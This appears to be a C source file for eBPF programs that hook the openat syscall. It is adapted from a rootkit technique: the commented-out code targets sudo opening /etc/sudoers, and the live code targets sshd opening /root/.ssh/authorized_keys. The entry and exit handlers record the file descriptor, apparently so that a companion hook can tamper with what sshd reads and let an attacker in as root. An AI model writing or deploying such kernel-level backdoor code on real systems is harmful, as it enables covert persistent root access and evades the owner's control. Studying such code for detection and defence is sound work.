#include "./common.h"
SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    // struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (target_ppid != 0)
    {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid)
        {
            return 0;
        }
    }
    // Check comm is sudo
    // char comm[TASK_COMM_LEN];
    char common[TASK_COMM_LEN];
    if(bpf_get_current_comm(&common, TASK_COMM_LEN)) {
        return 0;
    }
    // bpf_printk("Comm: %s", common);
    
    const int sudo_len = 5;
    // const char *sudo = "sudo";
    const char *sudo = "sshd";
    for (int i = 0; i < sudo_len; i++)
    {
        if (common[i] != sudo[i])
        {
            return 0;
        }
    }
    
    // Now check we're opening sudoers
    // const int sudoers_len = 13;
    // const char *sudoers = "/etc/sudoers";
    const int sudoers_len = 27;
    const char *sudoers = "/root/.ssh/authorized_keys";
    char filename[27]; // 27 == sudoers_len
    bpf_probe_read_user(&filename, sudoers_len, (char *)ctx->args[1]);
    for (int i = 0; i < sudoers_len; i++)
    {
        if (filename[i] != sudoers[i])
        {
            return 0;
        }
    }
    
    // bpf_printk("Comm %s\n", common);
    // bpf_printk("Filename %s\n", filename);

    // If filtering by UID check that
    if (uid != 0)
    {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid)
        {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0)
    {
        return 0;
    }
    // int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    // unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}
